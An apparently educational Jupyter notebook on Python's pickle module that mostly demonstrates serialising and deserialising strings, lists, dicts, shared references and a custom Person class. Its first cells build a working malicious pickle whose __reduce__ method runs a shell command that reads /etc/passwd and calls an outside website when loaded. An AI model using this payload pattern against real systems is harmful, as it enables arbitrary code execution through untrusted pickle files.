{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "c03394ba",
   "metadata": {},
   "outputs": [],
   "source": [
    "import os \n",
    "import pickle"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "3077ed6f",
   "metadata": {},
   "outputs": [],
   "source": [
    "class Exploit():\n",
    "    def __reduce__(self):\n",
    "        return (os.system, ('cat /etc/passwd > exploit.txt && curl www.google.com >> exploit.txt', ))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "12a36cd6",
   "metadata": {},
   "outputs": [],
   "source": [
    "def serialize_exploit(fname):\n",
    "    with open(fname, 'wb') as f:\n",
    "        pickle.dump(Exploit(), f)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "6ea09be4",
   "metadata": {},
   "outputs": [],
   "source": [
    "serialize_exploit('loadme')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "8b539b36",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "1"
      ]
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import pickle\n",
    "pickle.load(open('loadme', 'rb'))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "7cd2e907",
   "metadata": {},
   "outputs": [],
   "source": [
    "ser = pickle.dumps('Python Pickle Peppers')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "30238efb",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'\\x80\\x04\\x95\\x19\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x8c\\x15Python Pickle Peppers\\x94.'"
      ]
     },
     "execution_count": 7,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "ser"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "98c22116",
   "metadata": {},
   "outputs": [],
   "source": [
    "deser = pickle.loads(ser)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "id": "985c9658",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'Python Pickle Peppers'"
      ]
     },
     "execution_count": 9,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "deser"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "bbf0a92a",
   "metadata": {},
   "outputs": [],
   "source": [
    "ser = pickle.dumps(3.14)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "id": "d77148d9",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'\\x80\\x04\\x95\\n\\x00\\x00\\x00\\x00\\x00\\x00\\x00G@\\t\\x1e\\xb8Q\\xeb\\x85\\x1f.'"
      ]
     },
     "execution_count": 11,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "ser"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "id": "a7b31bc6",
   "metadata": {},
   "outputs": [],
   "source": [
    "deser = pickle.loads(ser)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "id": "949e0271",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "3.14"
      ]
     },
     "execution_count": 13,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "deser"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "id": "ac52b029",
   "metadata": {},
   "outputs": [],
   "source": [
    "d = [10, 20, ('a', 'b', 30)]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "id": "d695f4d4",
   "metadata": {},
   "outputs": [],
   "source": [
    "ser = pickle.dumps(d)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "id": "f76c00c6",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'\\x80\\x04\\x95\\x15\\x00\\x00\\x00\\x00\\x00\\x00\\x00]\\x94(K\\nK\\x14\\x8c\\x01a\\x94\\x8c\\x01b\\x94K\\x1e\\x87\\x94e.'"
      ]
     },
     "execution_count": 16,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "ser"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "id": "aa915cac",
   "metadata": {},
   "outputs": [],
   "source": [
    "deser = pickle.loads(ser)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "id": "1edd61e0",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[10, 20, ('a', 'b', 30)]"
      ]
     },
     "execution_count": 18,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "deser"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "id": "b814d166",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "2547146956416"
      ]
     },
     "execution_count": 19,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "id(d)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "id": "b7a56448",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "2547146424512"
      ]
     },
     "execution_count": 20,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "id(deser)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "id": "9e2e9f05",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 21,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "deser == d"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "id": "fb25d5f3",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "False"
      ]
     },
     "execution_count": 22,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "deser is d"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "id": "a6ffbc1c",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2547146542880 {'x', 10, 'a', 'b'}\n",
      "2547146551392 {'x', 10, 'a', 'b'}\n"
     ]
    }
   ],
   "source": [
    "s = {'a', 'b', 'x', 10}\n",
    "ser = pickle.dumps(s)\n",
    "deser = pickle.loads(ser)\n",
    "print(id(s), s)\n",
    "print(id(deser), deser)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "id": "36afc8d6",
   "metadata": {},
   "outputs": [],
   "source": [
    "from datetime import datetime\n",
    "d = {\n",
    "    'a': 100,\n",
    "    'b': [1,2,3],\n",
    "    'c': (1,2,3),\n",
    "    'd': {'x': 1+1, 'y': datetime.now() }\n",
    "}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "id": "85fb591d",
   "metadata": {},
   "outputs": [],
   "source": [
    "ser = pickle.dumps(d)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "id": "e60eb788",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'\\x80\\x04\\x95`\\x00\\x00\\x00\\x00\\x00\\x00\\x00}\\x94(\\x8c\\x01a\\x94Kd\\x8c\\x01b\\x94]\\x94(K\\x01K\\x02K\\x03e\\x8c\\x01c\\x94K\\x01K\\x02K\\x03\\x87\\x94\\x8c\\x01d\\x94}\\x94(\\x8c\\x01x\\x94K\\x02\\x8c\\x01y\\x94\\x8c\\x08datetime\\x94\\x8c\\x08datetime\\x94\\x93\\x94C\\n\\x07\\xe9\\t\\x19\\x084\\x03\\x01\\xf9\\xda\\x94\\x85\\x94R\\x94uu.'"
      ]
     },
     "execution_count": 26,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "ser"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "id": "2c6b9fd5",
   "metadata": {},
   "outputs": [],
   "source": [
    "deser = pickle.loads(ser)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "id": "938dfabb",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'a': 100,\n",
       " 'b': [1, 2, 3],\n",
       " 'c': (1, 2, 3),\n",
       " 'd': {'x': 2, 'y': datetime.datetime(2025, 9, 25, 8, 52, 3, 129498)}}"
      ]
     },
     "execution_count": 28,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "deser"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "id": "7699648a",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 29,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "deser == d"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "id": "abb610d1",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "False"
      ]
     },
     "execution_count": 30,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "deser is d"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "id": "a6f43320",
   "metadata": {},
   "outputs": [],
   "source": [
    "d1 = {'a': 10, 'b': 20}\n",
    "d2 = {'x': 100, 'y': d1}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "id": "b8230591",
   "metadata": {},
   "outputs": [],
   "source": [
    "ser = pickle.dumps(d2)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "id": "d0c2146c",
   "metadata": {},
   "outputs": [],
   "source": [
    "d3 = pickle.loads(ser)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "id": "9038cc31",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'x': 100, 'y': {'a': 10, 'b': 20}}"
      ]
     },
     "execution_count": 34,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "d3"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 35,
   "id": "c243c779",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 35,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "d3['y'] == d2['y']"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "id": "63c2b37c",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "False"
      ]
     },
     "execution_count": 36,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "d3['y'] is d2['y']"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 37,
   "id": "ef8c88f0",
   "metadata": {},
   "outputs": [],
   "source": [
    "d1 = {'a': 1, 'b': 2}\n",
    "d2 = {'x': 100, 'y': d1, 'z': d1}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 38,
   "id": "c8ac9ef9",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 38,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "d2['y'] is d2['z']"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 39,
   "id": "b2b7d096",
   "metadata": {},
   "outputs": [],
   "source": [
    "ser = pickle.dumps(d2)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 40,
   "id": "d571c420",
   "metadata": {},
   "outputs": [],
   "source": [
    "deser = pickle.loads(ser)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 41,
   "id": "1d67f653",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'x': 100, 'y': {'a': 1, 'b': 2}, 'z': {'a': 1, 'b': 2}}"
      ]
     },
     "execution_count": 41,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "deser"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 42,
   "id": "295c6360",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 42,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "deser['y'] == deser['z']"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 43,
   "id": "db4ac663",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 43,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "deser['y'] is deser['z']"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 44,
   "id": "1eacf137",
   "metadata": {},
   "outputs": [],
   "source": [
    "d1 = {'a': 1, 'b': 2}\n",
    "d2 = {'x': 10, 'y': d1}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 45,
   "id": "d0df1abb",
   "metadata": {},
   "outputs": [],
   "source": [
    "d1_ser = pickle.dumps(d1)\n",
    "d2_ser = pickle.dumps(d2)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 46,
   "id": "7c95aab1",
   "metadata": {},
   "outputs": [],
   "source": [
    "del d1"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 47,
   "id": "c5981224",
   "metadata": {},
   "outputs": [],
   "source": [
    "del d2"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 48,
   "id": "19ee88fb",
   "metadata": {},
   "outputs": [],
   "source": [
    "d1 = pickle.loads(d1_ser)\n",
    "d2 = pickle.loads(d2_ser)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 49,
   "id": "e61e5cb3",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'a': 1, 'b': 2}"
      ]
     },
     "execution_count": 49,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "d1"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 50,
   "id": "84e534ec",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'x': 10, 'y': {'a': 1, 'b': 2}}"
      ]
     },
     "execution_count": 50,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "d2"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 51,
   "id": "9e788681",
   "metadata": {},
   "outputs": [],
   "source": [
    "d1['c'] = 3"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 52,
   "id": "429d769d",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'x': 10, 'y': {'a': 1, 'b': 2}}"
      ]
     },
     "execution_count": 52,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "d2"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 53,
   "id": "e9cad7a7",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "False"
      ]
     },
     "execution_count": 53,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "d2['y'] is d1"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 54,
   "id": "8f1963ae",
   "metadata": {},
   "outputs": [],
   "source": [
    "class Person:\n",
    "    def __init__(self, name, age):\n",
    "        self.name = name\n",
    "        self.age = age\n",
    "\n",
    "    def __eq__(self, other):\n",
    "        return self.name == other.name and self.age == other.age\n",
    "    \n",
    "    def __repr__(self):\n",
    "        return f'Person({self.name}, {self.age})'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 55,
   "id": "bace2126",
   "metadata": {},
   "outputs": [],
   "source": [
    "john = Person('John Cleese', 79)\n",
    "eric = Person('Eric Idle', 75)\n",
    "michael = Person('Michael Palin', 75)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 56,
   "id": "fe66841b",
   "metadata": {},
   "outputs": [],
   "source": [
    "parrot_sketch = {\n",
    "    'title': 'Parrot Sketch',\n",
    "    'actors': [john, michael],\n",
    "}\n",
    "\n",
    "ministry_sketch = {\n",
    "    'title': 'The Ministry of Silly Walks',\n",
    "    'actors': [john, michael]\n",
    "}\n",
    "\n",
    "joke_sketch = {\n",
    "    'title': 'Funniest Joke in the World',\n",
    "    'actors': [eric, michael]\n",
    "}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 57,
   "id": "c050e973",
   "metadata": {},
   "outputs": [],
   "source": [
    "fan_favorites = {\n",
    "    'user_1': [parrot_sketch, joke_sketch],\n",
    "    'user_2': [parrot_sketch, ministry_sketch]\n",
    "}\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 58,
   "id": "f2a2560e",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{'user_1': [{'actors': [Person(John Cleese, 79), Person(Michael Palin, 75)],\n",
      "             'title': 'Parrot Sketch'},\n",
      "            {'actors': [Person(Eric Idle, 75), Person(Michael Palin, 75)],\n",
      "             'title': 'Funniest Joke in the World'}],\n",
      " 'user_2': [{'actors': [Person(John Cleese, 79), Person(Michael Palin, 75)],\n",
      "             'title': 'Parrot Sketch'},\n",
      "            {'actors': [Person(John Cleese, 79), Person(Michael Palin, 75)],\n",
      "             'title': 'The Ministry of Silly Walks'}]}\n"
     ]
    }
   ],
   "source": [
    "from pprint import pprint\n",
    "pprint(fan_favorites)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 59,
   "id": "0f328192",
   "metadata": {},
   "outputs": [],
   "source": [
    "parrot_id_original = id(parrot_sketch)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 60,
   "id": "ef2fd579",
   "metadata": {},
   "outputs": [],
   "source": [
    "ser = pickle.dumps(fan_favorites)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 61,
   "id": "aa017600",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'\\x80\\x04\\x95\\x1a\\x01\\x00\\x00\\x00\\x00\\x00\\x00}\\x94(\\x8c\\x06user_1\\x94]\\x94(}\\x94(\\x8c\\x05title\\x94\\x8c\\rParrot Sketch\\x94\\x8c\\x06actors\\x94]\\x94(\\x8c\\x08__main__\\x94\\x8c\\x06Person\\x94\\x93\\x94)\\x81\\x94}\\x94(\\x8c\\x04name\\x94\\x8c\\x0bJohn Cleese\\x94\\x8c\\x03age\\x94KOubh\\n)\\x81\\x94}\\x94(h\\r\\x8c\\rMichael Palin\\x94h\\x0fKKubeu}\\x94(h\\x04\\x8c\\x1aFunniest Joke in the World\\x94h\\x06]\\x94(h\\n)\\x81\\x94}\\x94(h\\r\\x8c\\tEric Idle\\x94h\\x0fKKubh\\x10eue\\x8c\\x06user_2\\x94]\\x94(h\\x03}\\x94(h\\x04\\x8c\\x1bThe Ministry of Silly Walks\\x94h\\x06]\\x94(h\\x0bh\\x10eueu.'"
      ]
     },
     "execution_count": 61,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "ser"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 62,
   "id": "28d60227",
   "metadata": {},
   "outputs": [],
   "source": [
    "new_fan_favorites = pickle.loads(ser)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 63,
   "id": "629f7ea1",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{'user_1': [{'actors': [Person(John Cleese, 79), Person(Michael Palin, 75)],\n",
      "             'title': 'Parrot Sketch'},\n",
      "            {'actors': [Person(Eric Idle, 75), Person(Michael Palin, 75)],\n",
      "             'title': 'Funniest Joke in the World'}],\n",
      " 'user_2': [{'actors': [Person(John Cleese, 79), Person(Michael Palin, 75)],\n",
      "             'title': 'Parrot Sketch'},\n",
      "            {'actors': [Person(John Cleese, 79), Person(Michael Palin, 75)],\n",
      "             'title': 'The Ministry of Silly Walks'}]}\n"
     ]
    }
   ],
   "source": [
    "pprint(new_fan_favorites)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 64,
   "id": "d4b3113b",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 64,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "fan_favorites == new_fan_favorites"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 66,
   "id": "8abae6a1",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(2547148281536, 2547148281536)"
      ]
     },
     "execution_count": 66,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "id(fan_favorites['user_1'][0]), id(fan_favorites['user_2'][0])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 67,
   "id": "642605a1",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(2547147176576, 2547147176576)"
      ]
     },
     "execution_count": 67,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "id(new_fan_favorites['user_1'][0]), id(new_fan_favorites['user_2'][0])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 68,
   "id": "2485b969",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "2547148281536"
      ]
     },
     "execution_count": 68,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "parrot_id_original"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "313f224e",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.13.2"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
